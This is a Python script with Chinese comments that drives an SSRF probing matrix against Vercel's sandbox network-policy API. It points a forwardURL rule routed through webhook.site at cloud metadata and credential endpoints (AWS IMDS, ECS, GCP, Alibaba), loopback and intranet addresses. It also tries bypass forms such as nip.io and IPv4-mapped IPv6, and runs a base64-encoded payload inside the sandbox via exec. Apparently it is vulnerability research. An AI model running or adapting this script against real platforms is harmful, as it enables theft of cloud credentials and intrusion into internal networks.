# 实验E5驱动: forwardURL SSRF 深度矩阵(https 强制下内网可达性差分)
# 触发域: webhook.site(已验证稳定) -> match path exact /latest -> forwardURL 指向目标
# 观察: update 校验层 + 沙箱响应差分
#   200+body  = 转发打通(拿到目标响应)
#   502       = 目标可达但 TLS/协议失败(网络层放行!)
#   503       = 连接失败/被拒(基线也503时需对照)
#   超时/EXC  = 被 drop 或无响应
import json, base64, pathlib, urllib.request, urllib.error, time

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"
WH = "9c7f5951-b5cd-4b74-afeb-f62d92e457db"

def api(method, path, body=None, timeout=60):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

NAME = "expe5"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME,
            "networkPolicy": {"mode": "custom", "allowedDomains": ["webhook.site"]}})
print("create:", c)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid)

def run_round(label, fwd_url):
    print(f"\n########## {label}: forwardURL={fwd_url} ##########", flush=True)
    c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/network-policy?teamId={TEAM}",
               {"allow": {"webhook.site": [{"match": {"path": {"exact": "/latest"}},
                                            "forwardURL": fwd_url}]}})
    if c != 200:
        print(f"update FAILED: {c} {r[:300]}", flush=True)
        return
    print("update OK", flush=True)
    time.sleep(2)
    payload = base64.b64encode(pathlib.Path("exp_e5.py").read_bytes()).decode()
    body = {"command": "python3", "args": ["-c",
            f"import base64;exec(base64.b64decode('{payload}').decode())", "latest"],
            "wait": True, "logs": True, "timeout": 45000}
    c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
    print(f"cmd: {c}", flush=True)
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:300], flush=True)
    time.sleep(1)

# R0 基线: 转发到可控 webhook(验证链路 + path 拼接行为)
run_round("R0-BASELINE", f"https://webhook.site/{WH}")
# R1 AWS IMDS https(IMDS 仅 HTTP:80, 443 预期 TLS 失败/超时)
run_round("R1-IMDS", "https://169.254.169.254")
# R2 agent 内部网关 https
run_round("R2-AGENT-GW", "https://100.64.0.1")
# R3 回环端口(对比 E4 的 503)
run_round("R3-LOOPBACK", "https://127.0.0.1:26661")
# R4 内网段
run_round("R4-INTRANET", "https://10.0.0.1")
# R5 GCP metadata 域名形式
run_round("R5-GCP-META", "https://metadata.google.internal")
# R6 nip.io: DNS 解析到 IMDS IP(网络层是否按解析后 IP 拦截)
run_round("R6-NIP-IMDS", "https://169.254.169.254.nip.io")
# R7 IPv6 回环
run_round("R7-V6-LOOP", "https://[::1]:26661")
# R8 IPv4-mapped IPv6 IMDS
run_round("R8-V4MAP-IMDS", "https://[::ffff:169.254.169.254]")
# R9 公网对照(预期 200 返回 example.com 页面)
run_round("R9-PUBLIC-CTRL", "https://example.com")
# R10 AWS 实例内网域名(宿主机 DNS 解析?)
run_round("R10-AWS-INTRADNS", "https://instance-data.ec2.internal")
# R11 阿里云 IMDS https
run_round("R11-ALI-IMDS", "https://100.100.100.200")
# R12 AWS ECS 容器凭据端点 https
run_round("R12-ECS-CRED", "https://169.254.170.2")

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
